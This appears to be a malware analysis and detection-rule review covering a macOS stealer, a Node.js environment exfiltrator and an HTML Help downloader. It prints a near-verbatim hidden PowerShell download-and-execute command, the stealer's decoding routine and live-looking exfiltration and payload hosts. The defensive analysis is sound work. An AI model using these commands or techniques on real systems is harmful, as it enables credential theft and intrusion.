Stranded member review, 2026-10-28

All three extracted members are MALICIOUS based on their retained bytes. The
three enclosing archives keep the user's confirmed-malware disposition; their
verdicts were not reconsidered. Markers were written beside the extracted
members and at the original sample paths. No payload, downloader, or remote
endpoint was executed or contacted.

| Artifact | Hostile before → after | Suspicious before → after | Classifier before → after |
|---|---:|---:|---|
| Installer member, standalone and archived | 20 → 20 | 12 → 12 | On threshold grid → on grid |
| parser-session writer.js, standalone and archived | 8 → 8 | 6 → 6 | On threshold grid → on grid |
| help.html, standalone and archived | 5 → 4 | 3 → 1 | On grid → below grid |
| bb44cfe macOS package, aggregate | 20 → 20 | 13 → 13 | On grid → on grid |
| parser-session ZIP, aggregate | 8 → 8 | 6 → 6 | On grid → on grid |
| cf1ffcc CHM, aggregate | 6 → 5 | 4 → 2 | On grid → on grid |

Counts use fresh local slow atomscan scans with this checkout selected by
CLEAVE_TRAITS_DIR and reference fetching disabled. cleave facts was also run
on every original archive and each member. Members' SHA-256 values match the
requested identities. A baseline rule snapshot reconstructed from tracked HEAD
rules and CLEAVE_SKIP_CACHE=1 rechecks established that the Installer and writer
have identical before/after trait IDs. An earlier cached Installer report had
extra neutral/group findings; fresh baseline and edited scans agree, so this
was not an attack-coverage loss.

Installer: universal Mach-O credential and wallet stealer

SHA-256: 8202c3887b75b107f76385fe36e7949860b7931cebd2c65899649556c37e30bc.
The executable was recovered from Package.pkg/Payload, a gzip-compressed CPIO
inside the XAR package. Both x86-64 and arm64 entry paths build a string and
pass its C string to system(). Rizin disassembly establishes the decoding and
execution path; this conclusion is not based only on recovered text.

The arm64 path copies 0x90dc bytes from slice offset 0xddc, skips a four-byte
seed, and XOR-decodes 37,077 bytes using state 0x11667. For each byte it emits
cipher_byte XOR (state & 255), then advances state to
((state * 0x3785) & 0xffffffff) % 35999. The modulus is computed from the
embedded build-time string 09:59:59, rather than an analysis-time clock check.
The encrypted constant block is identical across the two slices. The decoded
string starts osascript -e and constructs an AppleScript through return-joined
quoted lines, then runs it. Numeric handler names conceal the script structure.

The final handler invokes the file-copy, password, browser, wallet, upload,
replacement and persistence helpers. It reads a cached ~/.pwd and validates it
with dscl authonly, otherwise repeats a masked Installation password dialog
until a valid login password is returned. It stages that password, the login
Keychain database, Safari cookies and form data, Chromium stores and wallet
extension data, Firefox stores, desktop wallets, Notes, and selected personal
files. Desktop/Documents copying has a combined 10 MiB limit. It collects
system_profiler output, creates /tmp/out.zip with ditto, uploads it using curl
--data-binary with build/username headers to an HTTP /log endpoint, then removes
the collection directory and ZIP. The configured host is charge0x.at.

The later calls kill and remove Ledger Live, download a replacement ZIP and
extract it into /Applications. Another helper obtains shell-command text from
the server, embeds it in a KeepAlive/RunAtLoad LaunchDaemon definition, copies
the plist into /Library/LaunchDaemons through password-fed sudo, and bootstraps
it. If bootstrap fails, it attempts a nohup fallback. UserName is set in the
plist: this is not evidence that the final implant necessarily executes as
root. The phished password does authorize privileged system-file operations.

The credential harvesting, unauthorized broad collection/upload, wallet
replacement, cleanup and persistence outweigh the Installer presentation.
Existing hostile rules cover phishing, browser/Keychain/wallet acquisition,
file collection and export, cleanup, privileged operations, replacement and
LaunchDaemon persistence. All 20 hostile and 12 suspicious findings remain;
no additional family attribution or duplicated behavior was needed. Endpoint
execution, successful exfiltration, and the server's final payload remain
unobserved.

parser-session writer: concealed environment exporter and response evaluator

SHA-256: 419285d369ff0ebace833f59151cdc43412d7f8203c57f5bab831435f9f7457c.
At module scope, writer.js gathers all process.env values plus version,
os.platform(), os.hostname(), os.userInfo().username and non-internal IPv4
interface MAC addresses. Its g() helper replaces each hex pair with a character
using parseInt(..., 16) and String.fromCharCode(). The table decodes to require,
axios, post, an HTTPS endpoint, headers, x-secret-header, secret and then.

The exported arrow function resolves require(hl[1])[[hl[2]]] to axios.post,
passes the collected data as the POST body, sets the custom header, then
resolves [[hl[7]]] to then and runs eval(r.data) on the HTTP response. A trailing
empty catch hides failures. The endpoint is
https://log-server-lovat.vercel.app/api/ipcheck/703. The request/response chain,
whole-environment export, concealed dispatch and arbitrary response evaluation
are supported by the retained function itself. A logger/session package has no
credible ordinary need for this combination.

The supplied package contains material execution limitations: writer's
require('../package.json') resolves to src/package.json, which is absent, and
src/index.js invokes a writer from a different .pnpm sidecar path. The listed
writer is therefore not proven reachable through the supplied entrypoint, and
its own import may fail without the missing relative JSON file. This limits
claims of actual compromise; it does not remove the retained exporter/evaluator
attack. No behavior from an absent sidecar or downloaded server response is
attributed to this member. Existing eight hostile and six suspicious rules
cover concealed dispatch, environment/identity/MAC/platform export, the survey,
and response execution. Their exact finding IDs are unchanged.

HTML Help page: scripted hidden downloader

SHA-256: 8da3d93f84489ab85103bdd0cb5bd339ffe4be07a75a80c097959129f42c0d47.
The page presents Help Documentation, Loading content and Please wait, embeds
the HTML Help Shortcut control, configures Item1 to run cmd.exe /c powershell
-NoP -W Hidden -ExecutionPolicy Bypass, then invokes x.Click() directly from an
inline script. The PowerShell command assigns a TEMP EXE path to $p, uses a
WebClient to DownloadFile from https://softpeak.live/install/install_23.exe to
$p, then Start-Process $p. The object id and clicked receiver agree in these
bytes. It is a hidden executable delivery chain behind a help-page facade.

Activation depends on the HTML Help host allowing the control/script and on
network/payload availability. No successful execution or downloaded EXE is
claimed. The standalone HTML retains the attack command even though a plain
browser need not support its HTML Help control.

Corrections and coverage preservation

* Added a neutral, variable-bound DownloadFile-to-Start-Process rule. It compares
  the complete destination and launch variable tokens, supports case-insensitive
  PowerShell variables and FilePath, and rejects a different variable or a
  property access. A new hostile file-execution composite adds the scripted
  HTML Help trigger, WebClient and hidden interpreter evidence. This supplies
  the previously absent linked staging/launch detection.
* Moved the two scripted Shortcut findings from legacy CHM delivery into
  execution/trigger/document, with descriptions that do not overclaim an
  acquisition or an on-load condition from a generic Click matcher. Their
  effective predicates and criticalities are preserved. These are execution
  trigger observations, separate from the new bound payload handoff.
* Removed htmlhelp-shortcut-process-dropper as an independent hostile finding:
  it required only a control, Command=ShortCut and an arbitrary process target.
  Ordinary application launch from help is a documented feature, including
  Microsoft's Notepad example. Neutral control/configuration and process-target
  findings remain. Both consumers now inline the exact original conjunction
  and CLSID alternatives, preserving their stronger attack requirements.
  Source: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/to-create-a-shortcut-in-a-help-topic
* Narrowed activex-object-remote-executable to require one of the existing
  browser-control launch-abuse detections. An arbitrary CLSID beside an EXE URL
  does not prove an ActiveX exploit. The CHM uses a documented Help mechanism,
  not evidence of T1203 exploitation. The COM object and executable URL remain
  notable, and the actual malicious Help chain remains hostile.
* Relocated the generic install_NN.exe reference out of Softpeak family identity
  to a notable executable-name observation, preserving its matcher and scope.
  A filename that any installer could use does not identify Softpeak malware.
* Folded the old TEMP/update.exe operands into the notable TEMP executable-path
  observation, retaining both old positive spellings and adding general paths.
  A TEMP executable operand is not a Softpeak-specific staging signature.
* Described the remaining Softpeak endpoint as a payload-host reference, not
  C2 established by an endpoint string. Removed the unsupported B0024
  single-instance mapping and inherited user-execution mapping from these
  reference-only family facts. The endpoint-plus-Help family detection remains.
* Extended the existing hidden-PowerShell command observation to HTML. No
  network, process, encoding or privilege capability was lowered below notable.

Exact and ancestor consumers were inspected for changed rules. The CHM parent
selector's remaining external consumer is PE/DLL-scoped, so relocating HTML-only
trigger rules does not remove an applicable match there. Existing ActiveX
ancestor consumers are JavaScript/VBS-scoped; the narrowed HTML/Makefile rule
was not applicable to them. The generic filename traits had no external exact
consumers. Sixteen existing browser fixtures outside this batch retained every
hostile and suspicious finding. Eight focused controls verify a renamed Help
loader (three behavioral hostile findings without a campaign host), an Office
Viewer launch positive, an arbitrary media control with a download link, a
normal shortcut configuration, differing destination/launch variables, a
variable property, a normal bootstrapper, and generic TEMP/installer references.
The normal bootstrapper retains the neutral linked-launch trait and gets no
hostile classification from that trait. New/relocated trigger and payload
composites have precision values 7.4, 6.3 and 8.1 respectively.

The material severe-finding reductions are therefore two unsupported hostile
convictions and two over-attributed suspicious filename/path findings, offset
by the new supported hostile payload chain and neutral retained observations.
No supported attack technique disappeared. Three extracted-member marker notes
and three retained archive marker notes are reproduced verbatim in the commit
body.

Remaining classifier disagreement

The standalone help.html ML result changes from probability 0.995, grid level
25, to 0.992441, grid level -1, despite four hostile and one suspicious static
findings. This is a classifier/threshold miss exposed by accurate rule
corrections. The CHM aggregate remains on the detection grid (probability
0.93337005, level 0), while Installer and writer remain on grid. The installed
model reports feature-spec version 18 while the engine expects 21, which limits
its use of newer features. No unsupported traits were restored to raise the
score. This is evidence of a malicious artifact, not proof that an endpoint
executed it or was compromised.

Full raw facts, disassembly, decoded AppleScript, before/after JSON reports,
precision output and regression results are in the named session scratch
folder /usr/local/var/cyclotron/tmp.noindex/cyclotron-0c3fbda2/scratch/stranded.
